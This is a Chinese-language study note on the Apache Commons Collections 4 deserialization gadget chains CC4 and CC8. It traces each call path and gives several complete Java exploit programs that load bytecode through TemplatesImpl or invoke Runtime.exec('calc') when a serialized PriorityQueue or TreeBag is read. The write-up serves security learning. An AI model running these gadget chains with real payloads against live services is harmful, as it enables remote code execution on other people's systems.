
# 前言
CC4适用于CommonsCollections4，是一个新的大版本更新

去掉了InvokerTransformer的Serializable继承，导致其无法序列化。


cc2和cc4就是一个东西，cc2到达的`ChainedTransformer.transform()`通过反射执行命令的那种

cc4到达的是`TemplatesImpl.newTransformer()`字节码执行命令的那种

# 环境
先说一下 jdk 这个环境，理论上只有 CC1 和 CC3 链受到 jdk 版本影响。为了避免踩坑，我还是用的 jdk8u65 的版本。

- [JDK8u65](https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html)
- [openJDK 8u65](http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4)
- Maven 3.6.3
- Commons-Collections 4.0


```java
<dependency>  
 <groupId>org.apache.commons</groupId>  
 <artifactId>commons-collections4</artifactId>  
 <version>4.0</version>  
</dependency>
```

# 链子流程
这里去找的是 `InstantiateTransformer` 类，其中有一个transform方法
![[Pasted image 20251214195552.png]]
查找调用，找到的是`TransformingComparator.compare()`其中调用了`transform()`
所以找谁调用了`compare()`
![[Pasted image 20251214195633.png]]
找到了`PriorityQueue` 这个类中的 `siftDownUsingComparator()` 方法调用了之前的 `compare()` 方法。
![[Pasted image 20251214195823.png]]
向上跟踪查找用法找到`PriorityQueue.siftDown()`
![[Pasted image 20251214195915.png]]
`PriorityQueue.heapify()`

![[Pasted image 20251214200409.png]]
最终回到了`readObject()`
![[Pasted image 20251214200523.png]]

ok最后捋一下
`PriorityQueue.readObject()`->`PriorityQueue.heapify()`->`PriorityQueue.siftDown()`->`PriorityQueue.siftDownUsingComparator()`->`TransformingComparator.compare()`->`transform()`方法
```java
public int compare(final I obj1, final I obj2) {  
    final O value1 = this.transformer.transform(obj1);  
    final O value2 = this.transformer.transform(obj2);  
    return this.decorated.compare(value1, value2);  
}
```

# exp
首先我们执行危险字节码,把cc3的粘过来
```java
public class CC3 {  
    public static void main(String[] args)throws Exception {  
        //反射  
        TemplatesImpl templates = new TemplatesImpl();  
        Class<? extends TemplatesImpl> getclass = templates.getClass();  
        //_name赋值  
        Field name = getclass.getDeclaredField("_name");  
        name.setAccessible(true);  
        name.set(templates,"anything");  
        //_bytecodes赋值  
        Field bytecodes = getclass.getDeclaredField("_bytecodes");  
        bytecodes.setAccessible(true);  
        byte[] bytes = Files.readAllBytes(Paths.get("E:\\load\\IDEA\\code\\CC1\\src\\main\\java\\org\\example\\CC\\CC3\\Test.class"));  
        byte[][] bytes1 ={bytes};  
        bytecodes.set(templates,bytes1);  
        //_tfactory赋值  
        Field tfactory = getclass.getDeclaredField("_tfactory");  
        tfactory.setAccessible(true);  
        tfactory.set(templates,new TransformerFactoryImpl());  
  
  
        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});  
        //instantiateTransformer.transform(TrAXFilter.class);  
        
        org.apache.commons.collections.Transformer[] transformers = new Transformer[]{  
        new org.apache.commons.collections.functors.ConstantTransformer(TrAXFilter.class),  
        instantiateTransformer  
};  
  
org.apache.commons.collections.functors.ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

```

所以我们只要调用instantiateTransformer的transform方法即可

把上面的流程接进来
## 发现问题
```java
package com.example.demo.CC.CC4;  
  
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
import org.apache.commons.collections4.Transformer;  
import org.apache.commons.collections4.comparators.TransformingComparator;  
import org.apache.commons.collections4.functors.ChainedTransformer;  
import org.apache.commons.collections4.functors.ConstantTransformer;  
import org.apache.commons.collections4.functors.InstantiateTransformer;  
  
import javax.xml.transform.Templates;  
import java.io.*;  
import java.lang.reflect.Field;  
import java.nio.file.Files;  
import java.nio.file.Paths;  
  
import java.util.PriorityQueue;  
  
public class CC4Test {  
    public static void main(String[] args) throws Exception{  
        //反射  
        TemplatesImpl templates = new TemplatesImpl();  
        Class<? extends TemplatesImpl> getclass = templates.getClass();  
        //_name赋值  
        Field name = getclass.getDeclaredField("_name");  
        name.setAccessible(true);  
        name.set(templates,"anything");  
        //_bytecodes赋值  
        Field bytecodes = getclass.getDeclaredField("_bytecodes");  
        bytecodes.setAccessible(true);  
        byte[] bytes = Files.readAllBytes(Paths.get("E:\\load\\IDEA\\code\\CC1\\target\\classes\\com\\example\\demo\\CC\\CC3\\Test.class"));  
        byte[][] bytes1 ={bytes};  
        bytecodes.set(templates,bytes1);  
        //_tfactory赋值  
        Field tfactory = getclass.getDeclaredField("_tfactory");  
        tfactory.setAccessible(true);  
        tfactory.set(templates,new TransformerFactoryImpl());  
  
  
     InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});  
        //instantiateTransformer.transform(TrAXFilter.class);  
  
        Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(TrAXFilter.class),  
                instantiateTransformer  
        };  
  
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
  
//----------经典加载恶意字节码-------------------------------------  
        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);//transformer=chainedTransformer  
  
  
        PriorityQueue<Object> evilObject = new PriorityQueue<>(transformingComparator);//comparator=TransformingComparator  
  
        serialize(evilObject);  
        unserialize("ser.bin");  
  
  
  
    }  
  
    public  static void serialize(Object obj)throws Exception{  
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));  
        oos.writeObject(obj);  
  
    }  
    public  static  Object unserialize(String Filename)throws IOException,ClassNotFoundException{  
        ObjectInputStream ois=new ObjectInputStream(new FileInputStream(Filename));  
        Object obj=ois.readObject();  
        return obj;  
    }  
}
```
不知道为啥没弹计算器，对照一下exp看看，发现有很大不一样，我们打断点进去看看
我们的字节码那块肯定没问题，CC3跑过
重点看这两行
## 解决
```java
TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);//transformer=chainedTransformer  
  
  
PriorityQueue<Object> evilObject = new PriorityQueue<>(transformingComparator);//comparator=TransformingComparator
```
发现这里size原本为0，把size>>>1后为0，0-1=-1，并不能进入循环
![[Pasted image 20251214212451.png]]

那我们就反射把size改大点呗

>tips:
这里我们反射改大不能随便改，我们需要注意几个点

我们观察以下两个代码，最开始，我写的是第一种，只把对象传进去了
  ```java
      TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);//transformer=chainedTransformer  
  
  
        PriorityQueue<Object> evilObject = new PriorityQueue<>(transformingComparator);//comparator=TransformingComparator 
 //--------------------------------------------------------------------
 TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);//transformer=chainedTransformer  
  
PriorityQueue<Object> evilObject = new PriorityQueue<>(2,transformingComparator);//comparator=TransformingComparator
 ```
 
 构造方法中传入的第一个整数的作用是，初始化内部数组的**初始大小**。![[Pasted image 20251214233122.png]]
 而还记得我们调用的`compar()`嘛
 我们必须要有两个进行比较，才能走到compar
 这里的
 ```java
 for (int i = (size >>> 1) - 1; i >= 0; i--)
 ```
 ![[Pasted image 20251214233444.png]]
就是为了确定size的大小，size的作用是确定逻辑上的元素数量，如果有2个以上才进入for循环，一步一步走到我们的compare

所以我们需要注意，初始化构建对象的时候传入的初始化内部数组的大小必须大于下面我们反射修改的size

否则会 **数组越界**



这里给出两种解决方法

### 1.依然反射


```java
 public static void main(String[] args) throws Exception{  
        Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(Runtime.class),  
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),  
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{Runtime.class, null}),  
                new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"calc"}),  
                new ConstantTransformer(1)  
        };  
  
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
  
//----------------------------------------------  
        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);//transformer=chainedTransformer  
  
        PriorityQueue<Object> evilObject = new PriorityQueue<>(2,transformingComparator);//comparator=TransformingComparator  
  
        //反射修改size  
  
        Field size = PriorityQueue.class.getDeclaredField("size");  
        size.setAccessible(true);  
        size.set(evilObject,2);  
    
        serialize(evilObject);  
        unserialize("ser.bin");    
    }
```

### 2.使用`.add()`手动添加元素

```java
 public static void main(String[] args) throws Exception{  
        Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(Runtime.class),  
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),  
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{Runtime.class, null}),  
                new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"calc"}),  
                new ConstantTransformer(1)  
        };  
  
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
  
//-----------------------------------------------  
        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);//transformer=chainedTransformer  
  
        PriorityQueue<Object> evilObject = new PriorityQueue<>(2,transformingComparator);//comparator=TransformingComparator  
  
		evilObject.add(1); //添加第一个元素为1
		evilObject.add(1);//添加第二个元素为2
    
        serialize(evilObject);  
        unserialize("ser.bin");    
    }
```



### 字节码版本也就是CC4

```java
package com.example.demo.CC.CC4;  
  
  
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
import org.apache.commons.collections4.Transformer;  
import org.apache.commons.collections4.comparators.TransformingComparator;  
import org.apache.commons.collections4.functors.ChainedTransformer;  
import org.apache.commons.collections4.functors.ConstantTransformer;  
import org.apache.commons.collections4.functors.InstantiateTransformer;  
  
  
import javax.xml.transform.Templates;  
import java.io.*;  
import java.lang.reflect.Field;  
  
import java.nio.file.Files;  
import java.nio.file.Paths;  
import java.util.PriorityQueue;  
  
public class CC4Test {  
    public static void main(String[] args) throws Exception{  
        //反射  
        TemplatesImpl templates = new TemplatesImpl();  
        Class<? extends TemplatesImpl> getclass = templates.getClass();  
        //_name赋值  
        Field name = getclass.getDeclaredField("_name");  
        name.setAccessible(true);  
        name.set(templates,"anything");  
        //_bytecodes赋值  
        Field bytecodes = getclass.getDeclaredField("_bytecodes");  
        bytecodes.setAccessible(true);  
        byte[] bytes = Files.readAllBytes(Paths.get("E:\\load\\IDEA\\code\\CC1\\target\\classes\\com\\example\\demo\\CC\\CC3\\Test.class"));  
        byte[][] bytes1 ={bytes};  
        bytecodes.set(templates,bytes1);  
        //_tfactory赋值  
        Field tfactory = getclass.getDeclaredField("_tfactory");  
        tfactory.setAccessible(true);  
        tfactory.set(templates,new TransformerFactoryImpl());  
  
  
        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});  
        //instantiateTransformer.transform(TrAXFilter.class);  
  
        Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(TrAXFilter.class),  
                instantiateTransformer  
        };  
  
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
  
//----------经典加载恶意字节码-------------------------------------  
        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);//transformer=chainedTransformer  
  
        PriorityQueue<Object> evilObject = new PriorityQueue<>(2,transformingComparator);//comparator=TransformingComparator  
  
  
        //反射修改size  
  
        Field size = PriorityQueue.class.getDeclaredField("size");  
        size.setAccessible(true);  
        size.set(evilObject,2);  
  
  
  
  
        serialize(evilObject);  
        unserialize("ser.bin");  
  
  
  
    }  
  
    public  static void serialize(Object obj)throws Exception{  
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));  
        oos.writeObject(obj);  
  
    }  
    public  static  Object unserialize(String Filename)throws IOException,ClassNotFoundException{  
        ObjectInputStream ois=new ObjectInputStream(new FileInputStream(Filename));  
        Object obj=ois.readObject();  
        return obj;  
    }  
}
```

# CC8
`CC2/CC4` 中通过调用到 `TransformingComparator.compare() ` 方法来调用 `transform` 方法, 我们是通过 `PriorityQueue` 来走到这里的,

CC8从 `TreeMap.put()`,  中调用到了 `compare`走过去

```java
//TreeMap.java
public V put(K key, V value) {  
    Entry<K,V> t = root;  
    if (t == null) {  
        compare(key, key); // type (and possibly null) check  
  
        root = new Entry<>(key, value, null);  
        size = 1;  
        modCount++;  
        return null;  
     }
```
我们可以再往上找`TreeBag.readObject()`
```java
private void readObject(final ObjectInputStream in) throws IOException, ClassNotFoundException {  
    in.defaultReadObject();  
    @SuppressWarnings("unchecked")  // This will fail at runtime if the stream is incorrect  
    final Comparator<? super E> comp = (Comparator<? super E>) in.readObject();  
    super.doReadObject(new TreeMap<E, MutableInteger>(comp), in);  
}
```
其在反序列化时会构建这样一个 `TreeMap`, 同时也会到其基类上做一次 `doReadObject`
他的基类里调用了`map.put()`
![[Pasted image 20251215170027.png]]
所以我们整理一下

`TreeBag.readObject()`->`AbstractMapBag.doReadObject()`->`TreeMap.put()`->`TransformingComparator.compare()`->`transform()`


>note:
这里注意，我们add之后会直接走到基类中触发反序列化，所以我们add之前传个假的，add之后反射改回来
![[Pasted image 20251215181146.png]]![[Pasted image 20251215181218.png]]
```java
package com.example.demo.CC.CC4_CC2_CC8;  
  
import org.apache.commons.collections4.bag.TreeBag;  
import org.apache.commons.collections4.Transformer;  
import org.apache.commons.collections4.comparators.TransformingComparator;  
import org.apache.commons.collections4.functors.ChainedTransformer;  
import org.apache.commons.collections4.functors.ConstantTransformer;  
import org.apache.commons.collections4.functors.InvokerTransformer;  
  
import java.io.*;  
import java.lang.reflect.Field;  
  
public class CC8Test {  
    public static void main(String[] args) throws Exception {  
        Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(Runtime.class),  
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),  
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{Runtime.class, null}),  
                new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"calc"}),  
                new ConstantTransformer(1)  
        };  
  
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
        ChainedTransformer faketransformer = new ChainedTransformer<>(new Transformer[]{new ConstantTransformer(1)});  
  
  
        TransformingComparator transformingComparator = new TransformingComparator(faketransformer);//transformer=chainedTransformer  
        TreeBag treeBag = new TreeBag(transformingComparator);  
  
        treeBag.add("a");  
        treeBag.add("b");  
  
        Field iTransformers = TransformingComparator.class.getDeclaredField("transformer");  
        iTransformers.setAccessible(true);  
        iTransformers.set(transformingComparator,chainedTransformer);  
  
        //serialize(treeBag);  
        unserialize("ser.bin");  
  
  
    }  
    public  static void serialize(Object obj)throws Exception{  
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));  
        oos.writeObject(obj);  
  
    }  
    public  static  Object unserialize(String Filename)throws IOException,ClassNotFoundException{  
        ObjectInputStream ois=new ObjectInputStream(new FileInputStream(Filename));  
        Object obj=ois.readObject();  
        return obj;  
    }  
}
```

字节码版本
```java
package com.example.demo.CC.CC4_CC2_CC8;  
  
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
import org.apache.commons.collections4.Transformer;  
import org.apache.commons.collections4.bag.TreeBag;  
import org.apache.commons.collections4.comparators.TransformingComparator;  
import org.apache.commons.collections4.functors.InvokerTransformer;  
  
import java.io.*;  
import java.lang.reflect.Field;  
import java.nio.file.Files;  
import java.nio.file.Paths;  
  
public class CC8_CodeType {  
    public static void main(String[] args) throws Exception{  
  
        //反射  
        TemplatesImpl templates = new TemplatesImpl();  
        Class<? extends TemplatesImpl> getclass = templates.getClass();  
        //_name赋值  
        Field name = getclass.getDeclaredField("_name");  
        name.setAccessible(true);  
        name.set(templates,"anything");  
        //_bytecodes赋值  
        Field bytecodes = getclass.getDeclaredField("_bytecodes");  
        bytecodes.setAccessible(true);  
        byte[] bytes = Files.readAllBytes(Paths.get("E:\\load\\IDEA\\code\\CC1\\target\\classes\\com\\example\\demo\\CC\\CC3\\Test.class"));  
        byte[][] bytes1 ={bytes};  
        bytecodes.set(templates,bytes1);  
        //_tfactory赋值  
        Field tfactory = getclass.getDeclaredField("_tfactory");  
        tfactory.setAccessible(true);  
        tfactory.set(templates,new TransformerFactoryImpl());  
  
  
  
        // templates 复用上面的就可以了  
  
        Transformer fakerTransformer = new InvokerTransformer("toString", new Class[0], new Object[0]);  
        TransformingComparator cpr = new TransformingComparator(fakerTransformer);  
        TreeBag treeBag = new TreeBag(cpr);  
        treeBag.add(templates);  
  
  
        Field field = fakerTransformer.getClass().getDeclaredField("iMethodName");  
        field.setAccessible(true);  
        field.set(fakerTransformer, "newTransformer");  
  
        //serialize(treeBag);  
        //unserialize("ser.bin");  
    }  
    public  static void serialize(Object obj)throws Exception{  
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));  
        oos.writeObject(obj);  
  
    }  
    public  static  Object unserialize(String Filename)throws IOException,ClassNotFoundException{  
        ObjectInputStream ois=new ObjectInputStream(new FileInputStream(Filename));  
        Object obj=ois.readObject();  
        return obj;  
    }  
}
```




